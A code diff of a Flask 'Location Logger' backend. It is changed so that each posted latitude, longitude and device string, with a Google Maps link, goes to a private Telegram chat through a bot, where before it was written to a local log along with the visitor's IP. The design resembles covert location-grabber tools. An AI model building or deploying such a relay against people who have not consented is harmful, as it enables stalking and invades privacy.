@@ -1,9 +1,25 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import datetime
+import requests
 
 app = Flask(__name__)
-CORS(app)
+CORS(app)  # Allow Netlify frontend
+
+# 🔧 Replace with your bot token and chat ID
+BOT_TOKEN = '123456789:ABCdEfGhIjKLMNOPqrSTUvWXyz'
+CHAT_ID = '123456789'
+
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': CHAT_ID,
+        'text': message,
+        'parse_mode': 'Markdown'
+    }
+    try:
+        requests.post(url, json=payload)
+    except Exception as e:
+        print("Telegram error:", e)
 
 @app.route("/location", methods=["POST"])
 def receive_location():
@@ -16,22 +32,20 @@ def receive_location():
     timestamp = data.get("timestamp")
     user_agent = data.get("userAgent")
 
-    # Extract real IP (handle proxy)
-    ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
+    # Create log message
+    message = f"""📍 *New Location Received*
 
-    log_entry = (
-        f"[{timestamp}] IP: {ip_address} | Location: {latitude}, {longitude} | "
-        f"UA: {user_agent}\n"
-    )
+🕒 Time: `{timestamp}`
+🌐 Lat, Lon: `{latitude}, {longitude}`
+📱 Device: `{user_agent}`
 
-    print(log_entry)
+[View on Google Maps](https://maps.google.com/?q={latitude},{longitude})"""
 
-    # Save to file
-    with open("locations.log", "a") as f:
-        f.write(log_entry)
+    # Send to Telegram
+    send_to_telegram(message)
 
-    return jsonify({"status": "Location and IP received"}), 200
+    return jsonify({"status": "Location sent to Telegram"}), 200
 
 @app.route("/")
 def home():
-    return "Location Logger API is running!", 200
+    return "Location Logger API with Telegram is running.", 200
